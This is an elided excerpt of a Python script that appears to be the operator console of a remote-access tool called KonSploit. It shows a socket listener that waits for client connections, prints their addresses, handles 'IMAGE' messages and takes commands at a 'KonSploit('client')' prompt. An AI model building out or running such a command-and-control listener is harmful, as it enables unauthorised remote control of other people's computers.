...
def animate(message):
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        print("\r"+Style.BRIGHT+Fore.WHITE+message+c+Fore.RESET, end="")
        time.sleep(0.1)
...
if args.shell:
    ...
    while True:
        ...
        t = threading.Thread(target=animate,args=(" Waiting .. ",))
        t.start()
        conn, addr = soc.accept()
        done = True
        t.join()
        print(Fore.WHITE+"Got connection from "+Fore.RED+"".join(str(addr))+Fore.RESET)
        print(" ")
        while True:
            ...
            if(msg.strip() == "IMAGE"):
                ...
                print(msg)
            message_to_send = input(Style.BRIGHT+Fore.WHITE+"•> KonSploit('client')/> "+Fore.RESET)+"\n"
